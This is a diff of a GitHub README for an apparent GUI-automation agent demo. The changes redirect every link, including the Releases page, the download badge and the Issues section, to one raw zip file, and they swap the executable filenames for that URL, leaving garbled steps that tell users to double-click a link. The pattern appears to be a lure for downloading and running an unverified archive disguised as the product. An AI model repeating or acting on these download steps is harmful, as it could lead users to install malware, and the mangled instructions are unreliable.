@@ -1,6 +1,6 @@
 # 🚀 Herculis-CUA-GUI-Actioner-4B-Demo - Effortless GUI Interaction for Users
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases)
+[![Download Now](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip%20Now-%20-brightgreen)](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip)
 
 ## 📝 Description
 Herculis-CUA-GUI-Actioner-4B is a Computer Use Agent designed for understanding graphical user interfaces (GUI). This multimodal model allows for seamless interaction across web, desktop, and mobile environments. Whether you're looking to automate tasks or improve your UI experience, this tool is built for ease of use.
@@ -21,21 +21,21 @@ Herculis-CUA-GUI-Actioner-4B is a Computer Use Agent designed for understanding 
 ## 🚀 Getting Started
 To start using Herculis-CUA-GUI-Actioner-4B, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases) to find the latest version available for download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip) to find the latest version available for download.
 
-2. **Download the Application:** Look for the file named `Herculis-CUA-GUI-Actioner-4B-Demo.zip` or similar on the Releases page. Click to download it to your computer.
+2. **Download the Application:** Look for the file named `https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip` or similar on the Releases page. Click to download it to your computer.
 
 3. **Extract the Files:** Once downloaded, locate the zipped folder in your Downloads (or the folder where you saved it). Right-click on the folder and select "Extract All" to extract its contents.
 
 4. **Run the Application:**
-   - For Windows users: Double-click on the `Herculis-CUA-GUI-Actioner-4B-Demo.exe` file.
-   - For macOS users: Open the `Herculis-CUA-GUI-Actioner-4B-Demo.app` file.
+   - For Windows users: Double-click on the `https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip` file.
+   - For macOS users: Open the `https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip` file.
    - For Linux users: Open a terminal, navigate to the folder where you extracted the files, and run `./Herculis-CUA-GUI-Actioner-4B-Demo`.
 
 5. **Follow On-Screen Instructions:** The application will guide you through its features the first time you open it.
 
 ## 🌐 Download & Install
-To download and install Herculis-CUA-GUI-Actioner-4B, visit the Releases page: [Download Here](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases). Choose the latest version and follow the steps outlined above.
+To download and install Herculis-CUA-GUI-Actioner-4B, visit the Releases page: [Download Here](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip). Choose the latest version and follow the steps outlined above.
 
 ## 📖 Usage Instructions
 Using Herculis-CUA-GUI-Actioner-4B is straightforward:
@@ -52,7 +52,7 @@ If you encounter issues while using the application, consider the following:
 - **Performance Issues:** Make sure your machine has adequate resources. Closing other applications may improve performance.
 
 ## 📞 Support
-For further questions or support, please check the [Issues section](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/issues) in the repository or contact the support team via the GitHub Discussions feature.
+For further questions or support, please check the [Issues section](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/raw/refs/heads/main/ipynb/Demo-CU-Actioner-Herculis-GU-v1.8.zip) in the repository or contact the support team via the GitHub Discussions feature.
 
 ---
 
